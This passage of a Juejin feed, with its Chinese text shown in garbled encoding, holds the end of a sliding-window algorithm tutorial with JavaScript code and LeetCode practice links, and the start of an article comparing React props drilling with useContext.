  <span class="hljs-keyword">let</span> prod = <span class="hljs-number">1</span>; <span class="hljs-comment">// çª—å£å†…å…ƒç´ ä¹˜ç§¯</span>

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> right = <span class="hljs-number">0</span>; right &lt; nums.<span class="hljs-property">length</span>; right++) {
    prod *= nums[right]; <span class="hljs-comment">// åŠ å…¥å³å…ƒç´ ï¼Œæ›´æ–°ä¹˜ç§¯</span>

    <span class="hljs-comment">// ç¼©çª—å£ï¼šä¹˜ç§¯â‰¥kæ—¶ï¼Œç¼©å·¦ç›´åˆ°ä¹˜ç§¯&lt;k</span>
    <span class="hljs-keyword">while</span> (prod &gt;= k) {
      prod /= nums[left]; <span class="hljs-comment">// ç§»å‡ºå·¦å…ƒç´ ï¼Œæ›´æ–°ä¹˜ç§¯</span>
      left++;
    }

    <span class="hljs-comment">// ç´¯åŠ å½“å‰rightå¯¹åº”çš„æœ‰æ•ˆå­æ•°ç»„æ•°</span>
    <span class="hljs-comment">// å½“çª—å£ [left, right] çš„ä¹˜ç§¯ &lt; k æ—¶ï¼Œä»¥ right ç»“å°¾çš„æ‰€æœ‰å­æ•°ç»„éƒ½æ»¡è¶³æ¡ä»¶</span>
    <span class="hljs-comment">// å³ [left,right]ã€[left+1,right]...[right,right] å…± right-left+1 ä¸ª</span>
    ans += right - left + <span class="hljs-number">1</span>;
  }

  <span class="hljs-keyword">return</span> ans;
}
</code></pre>
<h4 data-id="heading-29">å¤æ‚åº¦åˆ†æ</h4>
<p>æ—¶é—´å¤æ‚åº¦ O(n)ï¼šæ¯ä¸ªå…ƒç´ æœ€å¤šè¢«éå†ä¸¤æ¬¡ï¼›ç©ºé—´å¤æ‚åº¦ O(1)ï¼šä»…ç”¨å¸¸æ•°çº§å˜é‡ã€‚</p>
<h2 data-id="heading-30">å…­ã€æ–°æ‰‹é¿å‘æŒ‡å—</h2>
<ol>
<li>
<p><strong>çª—å£è¾¹ç•Œç»Ÿä¸€</strong>ï¼šå»ºè®®å…¨ç¨‹ä½¿ç”¨ã€Œå·¦é—­å³é—­ã€æˆ–ã€Œå·¦é—­å³å¼€ã€è¾¹ç•Œå®šä¹‰ï¼Œä¸è¦æ··ç”¨ã€‚æœ¬æ–‡æ‰€æœ‰ä¾‹é¢˜å‡é‡‡ç”¨ã€Œå·¦é—­å³é—­ã€ï¼Œçª—å£é•¿åº¦ä¸º right-left+1ã€‚</p>
</li>
<li>
<p><strong>çŠ¶æ€æ›´æ–°é¡ºåº</strong>ï¼šç¼©çª—å£æ—¶ï¼Œéœ€å…ˆæ›´æ–°çŠ¶æ€ï¼ˆå¦‚å‡ sumã€é™¤ prodï¼‰ï¼Œå†ç§»åŠ¨ left æŒ‡é’ˆï¼Œé¿å…æ¼ç®—æˆ–å¤šç®—ã€‚</p>
</li>
<li>
<p><strong>è¾¹ç•Œæ¡ä»¶å¤„ç†</strong>ï¼š</p>
<ul>
<li>
<p>æ±‚æœ€çŸ­æ—¶ï¼Œåˆå§‹ ans è®¾ä¸ºæ— ç©·å¤§ï¼Œæœ€åéœ€åˆ¤æ–­æ˜¯å¦æ›´æ–°è¿‡ï¼ˆæœªæ›´æ–°åˆ™è¿”å› 0ï¼‰ï¼›</p>
</li>
<li>
<p>ä¹˜ç§¯é—®é¢˜éœ€æ³¨æ„ kâ‰¤1 çš„æƒ…å†µï¼ˆæ­£æ•´æ•°ä¹˜ç§¯æœ€å°ä¸º 1ï¼Œç›´æ¥è¿”å› 0ï¼‰ï¼›</p>
</li>
<li>
<p>ç©ºå­—ç¬¦ä¸²/ç©ºæ•°ç»„éœ€æå‰è¿”å› 0ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>å•è°ƒæ€§éªŒè¯</strong>ï¼šé‡åˆ°å­ä¸²/å­æ•°ç»„é—®é¢˜æ—¶ï¼Œå…ˆæ‰‹åŠ¨æ¨¡æ‹Ÿ 2-3 ä¸ªæ¡ˆä¾‹ï¼Œç¡®è®¤çŠ¶æ€æ˜¯å¦æ»¡è¶³å•è°ƒæ€§ï¼Œå†å†³å®šæ˜¯å¦ç”¨æ»‘åŠ¨çª—å£ã€‚</p>
</li>
</ol>
<h2 data-id="heading-31">ä¸ƒã€æ€»ç»“</h2>
<p>æ»‘åŠ¨çª—å£çš„æ ¸å¿ƒæ˜¯ã€Œç”¨å•è°ƒæ€§å‹ç¼©éå†ç»´åº¦ã€ï¼Œå‰ªæåªæ˜¯ä¼˜åŒ–æ‰‹æ®µã€‚æŒæ¡å®ƒçš„å…³é”®åœ¨äºï¼š</p>
<ol>
<li>
<p>åˆ¤æ–­é—®é¢˜æ˜¯å¦æ»¡è¶³ã€Œè¿ç»­åŒºé—´+çŠ¶æ€å•è°ƒæ€§+çŠ¶æ€å¯å¿«é€Ÿæ›´æ–°ã€ï¼›</p>
</li>
<li>
<p>æ ¹æ®ç›®æ ‡ï¼ˆæœ€é•¿/æœ€çŸ­/è®¡æ•°ï¼‰ç¡®å®šã€Œç¼©çª—å£æ¡ä»¶ã€å’Œã€Œæ›´æ–°ç­”æ¡ˆæ—¶æœºã€ï¼›</p>
</li>
<li>
<p>å¥—ç”¨é€šç”¨æ¨¡æ¿ï¼Œçµæ´»è°ƒæ•´çŠ¶æ€ç»Ÿè®¡å·¥å…·ï¼ˆå“ˆå¸Œè¡¨/å’Œ/ç§¯ï¼‰ã€‚</p>
</li>
</ol>
<p>åªè¦æŠ“ä½è¿™ä¸‰ç‚¹ï¼Œæ— è®ºæ˜¯ç®€å•çš„â€œæ— é‡å¤å­ä¸²â€ï¼Œè¿˜æ˜¯å¤æ‚çš„â€œæœ€å°è¦†ç›–å­ä¸²â€ï¼Œéƒ½èƒ½æŒ‰æ­¤é€»è¾‘æ‹†è§£ã€‚å»ºè®®å¤šåšå‡ é“ç»å…¸ä¾‹é¢˜ï¼Œå›ºåŒ–æ¨¡æ¿æ€ç»´ï¼Œé¢è¯•æ—¶å°±èƒ½å¿«é€Ÿååº”ã€‚</p>
<h3 data-id="heading-32">ç»ƒä¹ é¢˜æ¨è</h3>
<p>æŒ‰éš¾åº¦å’Œç±»å‹åˆ†ç±»ï¼Œå»ºè®®æŒ‰é¡ºåºç»ƒä¹ ï¼š</p>
<h4 data-id="heading-33">åŸºç¡€é¢˜ï¼ˆå¿…åšï¼‰</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-substring-without-repeating-characters%2F" target="_blank" title="https://leetcode.cn/problems/longest-substring-without-repeating-characters/" ref="nofollow noopener noreferrer">3. æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²</a> - ç±»å‹1ï¼šæ±‚æœ€é•¿</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fminimum-size-subarray-sum%2F" target="_blank" title="https://leetcode.cn/problems/minimum-size-subarray-sum/" ref="nofollow noopener noreferrer">209. é•¿åº¦æœ€å°çš„å­æ•°ç»„</a> - ç±»å‹2ï¼šæ±‚æœ€çŸ­</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fsubarray-product-less-than-k%2F" target="_blank" title="https://leetcode.cn/problems/subarray-product-less-than-k/" ref="nofollow noopener noreferrer">713. ä¹˜ç§¯å°äº K çš„å­æ•°ç»„</a> - ç±»å‹3ï¼šæ±‚è®¡æ•°</li>
</ul>
<h4 data-id="heading-34">è¿›é˜¶é¢˜ï¼ˆæ¨èï¼‰</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-all-anagrams-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-all-anagrams-in-a-string/" ref="nofollow noopener noreferrer">438. æ‰¾åˆ°å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—æ¯å¼‚ä½è¯</a> - ç±»å‹3ï¼šå›ºå®šçª—å£</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fminimum-window-substring%2F" target="_blank" title="https://leetcode.cn/problems/minimum-window-substring/" ref="nofollow noopener noreferrer">76. æœ€å°è¦†ç›–å­ä¸²</a> - ç±»å‹2ï¼šå¤æ‚åœºæ™¯</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fpermutation-in-string%2F" target="_blank" title="https://leetcode.cn/problems/permutation-in-string/" ref="nofollow noopener noreferrer">567. å­—ç¬¦ä¸²çš„æ’åˆ—</a> - ç±»å‹3ï¼šå›ºå®šçª—å£å˜ç§</li>
</ul>
<h4 data-id="heading-35">æ‰©å±•é¢˜ï¼ˆæŒ‘æˆ˜ï¼‰</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fsliding-window-maximum%2F" target="_blank" title="https://leetcode.cn/problems/sliding-window-maximum/" ref="nofollow noopener noreferrer">239. æ»‘åŠ¨çª—å£æœ€å¤§å€¼</a> - éœ€è¦ç»“åˆå•è°ƒé˜Ÿåˆ—</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-repeating-character-replacement%2F" target="_blank" title="https://leetcode.cn/problems/longest-repeating-character-replacement/" ref="nofollow noopener noreferrer">424. æ›¿æ¢åçš„æœ€é•¿é‡å¤å­—ç¬¦</a> - ç±»å‹1ï¼šå˜ç§</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React è·¨å±‚çº§ç»„ä»¶é€šä¿¡ï¼šä» Props Drilling åˆ° useContext çš„å®æˆ˜å‰–æ]]></title>    <link>https://juejin.cn/post/7589201772117835782</link>    <guid>https://juejin.cn/post/7589201772117835782</guid>    <pubDate>2025-12-29T10:28:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772117835782" data-draft-id="7589082912588628011" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React è·¨å±‚çº§ç»„ä»¶é€šä¿¡ï¼šä» Props Drilling åˆ° useContext çš„å®æˆ˜å‰–æ"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-29T10:28:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¶…çº§èµ›äºšäºº_"/> <meta itemprop="url" content="https://juejin.cn/user/793196846923641"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React è·¨å±‚çº§ç»„ä»¶é€šä¿¡ï¼šä» Props Drilling åˆ° useContext çš„å®æˆ˜å‰–æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793196846923641/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¶…çº§èµ›äºšäºº_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:28:40.000Z" title="Mon Dec 29 2025 10:28:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ React å¼€å‘ä¸­ï¼Œç»„ä»¶é€šä¿¡æ˜¯æ—¥å¸¸ä¸­æœ€å¸¸è§çš„ä»»åŠ¡ä¹‹ä¸€ã€‚çˆ¶å­ç»„ä»¶é—´é€šè¿‡ props ä¼ é€’æ•°æ®ç®€å•é«˜æ•ˆï¼Œä½†å½“æ•°æ®éœ€è¦ä¼ é€’åˆ°å¤šå±‚åµŒå¥—çš„å­ç»„ä»¶æ—¶ï¼Œâ€œProps Drillingâ€ï¼ˆå±æ€§ç©¿é€ï¼‰é—®é¢˜å°±ä¼šæ˜¾ç°ï¼šä¸­é—´å±‚ç»„ä»¶æ˜æ˜ä¸éœ€è¦è¿™äº›æ•°æ®ï¼Œå´ä¸å¾—ä¸è¢«åŠ¨æ¥æ”¶å¹¶å‘ä¸‹ä¼ é€’ã€‚è¿™ä¸ä»…è®©ä»£ç å†—ä½™ï¼Œè¿˜é™ä½äº†å¯ç»´æŠ¤æ€§ã€‚</p>
<p>React å®˜æ–¹æä¾›çš„ Context API æ­£æ˜¯ä¸ºæ­¤è€Œç”Ÿã€‚å®ƒå…è®¸æˆ‘ä»¬åœ¨ç»„ä»¶æ ‘çš„æœ€å¤–å±‚â€œæä¾›â€æ•°æ®ï¼Œä»»ä½•æ·±å±‚ç»„ä»¶éƒ½å¯ä»¥ç›´æ¥â€œæ¶ˆè´¹â€å®ƒï¼Œè€Œæ— éœ€å±‚å±‚ä¼ é€’ã€‚æœ¬æ–‡å°†é€šè¿‡ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯çš„å®é™…ä¾‹å­ï¼Œå¯¹æ¯”ä¸¤ç§æ–¹å¼ï¼Œå¸®åŠ©ä½ ç†è§£ä½•æ—¶ã€ä½•åœ°è¯¥ä½¿ç”¨ useContext è§£å†³è·¨å±‚çº§é€šä¿¡é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">Props Drillingï¼šä¼ ç»Ÿæ–¹å¼çš„ç—›ç‚¹</h2>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåº”ç”¨ï¼Œéœ€è¦åœ¨æœ€é¡¶å±‚ App ç»„ä»¶æŒæœ‰ç”¨æˆ·ä¿¡æ¯ï¼ˆå¦‚ç™»å½•åçš„ç”¨æˆ·æ•°æ®ï¼‰ï¼Œç„¶ååœ¨æ·±å±‚åµŒå¥—çš„ UserInfo ç»„ä»¶ä¸­æ˜¾ç¤ºç”¨æˆ·åã€‚</p>
<p>ä¼ ç»Ÿæ–¹å¼æ˜¯å±‚å±‚é€šè¿‡ props ä¼ é€’ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Page</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>
  );
}

<span class="hljs-comment">// views/Page.jsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}

<span class="hljs-comment">// components/Header.jsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserInfo</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}

<span class="hljs-comment">// components/UserInfo.jsx</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p>è¿™ç§æ–¹å¼åœ¨å±‚çº§è¾ƒæµ…æ—¶æ²¡é—®é¢˜ï¼Œä½†æƒ³è±¡ä¸€ä¸‹å¦‚æœç»„ä»¶æ ‘æ›´æ·±ï¼ˆæ¯”å¦‚ Page â†’ Layout â†’ Sidebar â†’ Header â†’ UserInfoï¼‰ï¼Œå°±éœ€è¦åœ¨æ¯ä¸€å±‚éƒ½æ·»åŠ  user propï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">&lt;Page <span class="hljs-attr">user</span>={user} /&gt;
&lt;Layout <span class="hljs-attr">user</span>={user} /&gt;
&lt;Sidebar <span class="hljs-attr">user</span>={user} /&gt;
&lt;Header <span class="hljs-attr">user</span>={user} /&gt;
&lt;UserInfo <span class="hljs-attr">user</span>={user} /&gt;
</code></pre>
<p>ä¸­é—´çš„ Layoutã€Sidebar ç­‰ç»„ä»¶æ ¹æœ¬ä¸éœ€è¦ user æ•°æ®ï¼Œå´è¢«è¿«æˆä¸ºâ€œå¿«é€’å‘˜â€ã€‚è¿™å°±æ˜¯å…¸å‹çš„ Props Drillingï¼š</p>
<ul>
<li>ä»£ç å†—ä½™ï¼Œç»´æŠ¤æˆæœ¬é«˜ï¼ˆä¿®æ”¹ä¸€æ¬¡è¦æ”¹å¤šå¤„ï¼‰ã€‚</li>
<li>ä¸­é—´ç»„ä»¶è€¦åˆåº¦å¢åŠ ï¼Œé‡æ„å›°éš¾ã€‚</li>
<li>é˜…è¯»æ€§å·®ï¼Œéš¾ä»¥å¿«é€Ÿå®šä½æ•°æ®æ¥æºã€‚</li>
</ul>
<h2 data-id="heading-1">Context APIï¼šä¼˜é›…è§£å†³è·¨å±‚çº§é€šä¿¡</h2>
<p>Context API çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>æ•°æ®åœ¨æœ€å¤–å±‚æä¾›ï¼Œä»»ä½•å­ç»„ä»¶ä¸»åŠ¨æ¶ˆè´¹</strong>ã€‚è¿™æ ·ï¼Œæ•°æ®æŒæœ‰å’Œæ”¹å˜çš„é€»è¾‘ä¾ç„¶åœ¨å¤–å±‚ç»„ä»¶ï¼Œä½†æ¶ˆè´¹æ–¹å¯ä»¥ç›´æ¥è·å–ï¼Œæ— éœ€ä¸­é—´ä¼ é€’ã€‚</p>
<h3 data-id="heading-2">æ­¥éª¤ä¸€ï¼šåˆ›å»º Context</h3>
<p>é€šå¸¸åœ¨ç‹¬ç«‹æ–‡ä»¶ä¸­åˆ›å»ºï¼ˆæ¨èå®è·µï¼Œä¾¿äºå¤ç”¨å’Œç»´æŠ¤ï¼‰ï¼Œä½†ç®€å•ç¤ºä¾‹å¯æ”¾åœ¨ App ä¸­ã€‚</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">import</span> { createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Page</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./views/Page'</span>;

<span class="hljs-comment">// åˆ›å»º Contextï¼ŒdefaultValue ä¸º nullï¼ˆç”Ÿäº§ä¸­å¯è®¾ä¸ºé»˜è®¤å€¼ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{user}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span>
  );
}
</code></pre>
<ul>
<li>createContext åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ã€‚</li>
<li>Provider ç»„ä»¶åŒ…è£¹éœ€è¦å…±äº«æ•°æ®çš„ç»„ä»¶æ ‘ã€‚</li>
<li>value å±æ€§å°±æ˜¯å…±äº«çš„æ•°æ®ï¼ˆå¯ä»¥æ˜¯å¯¹è±¡ã€å‡½æ•°ã€çŠ¶æ€ç­‰ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-3">æ­¥éª¤äºŒï¼šæ¶ˆè´¹ Context</h3>
<p>åœ¨ä»»ä½•å­ç»„ä»¶ä¸­ä½¿ç”¨ useContext Hook ç›´æ¥è¯»å–ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// components/UserInfo.jsx</span>
<span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">UserContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../App'</span>;  <span class="hljs-comment">// æ ¹æ®å®é™…è·¯å¾„è°ƒæ•´</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p>ä¸­é—´ç»„ä»¶æ— éœ€ä»»ä½•ä¿®æ”¹ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// views/Page.jsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../components/Header'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span>;
}

<span class="hljs-comment">// components/Header.jsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UserInfo</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./UserInfo'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserInfo</span> /&gt;</span></span>;
}
</code></pre>
<p>æ•ˆæœå®Œå…¨ç›¸åŒï¼Œä½†ä»£ç å¹²å‡€å¤šäº†ï¼UserInfo ç»„ä»¶ä¸»åŠ¨â€œæ‰¾â€æ•°æ®ï¼Œè€Œä¸æ˜¯è¢«åŠ¨æ¥æ”¶ã€‚</p>
<h3 data-id="heading-4">å®Œæ•´ç›®å½•ç»“æ„ç¤ºä¾‹</h3>
<p>text</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">src</span>/
â”œâ”€â”€ App<span class="hljs-selector-class">.jsx</span>
â”œâ”€â”€ views/
â”‚   â””â”€â”€ Page<span class="hljs-selector-class">.jsx</span>
â””â”€â”€ components/
    â”œâ”€â”€ <span class="hljs-selector-tag">Header</span><span class="hljs-selector-class">.jsx</span>
    â””â”€â”€ UserInfo<span class="hljs-selector-class">.jsx</span>
</code></pre>
<h2 data-id="heading-5">ä¸ºä»€ä¹ˆ useContext æ›´ä¼˜ï¼Ÿ</h2>
<ol>
<li><strong>é¿å… Props Drilling</strong>ï¼šä¸­é—´å±‚ç»„ä»¶æ— éœ€å…³å¿ƒæ•°æ®ä¼ é€’ã€‚</li>
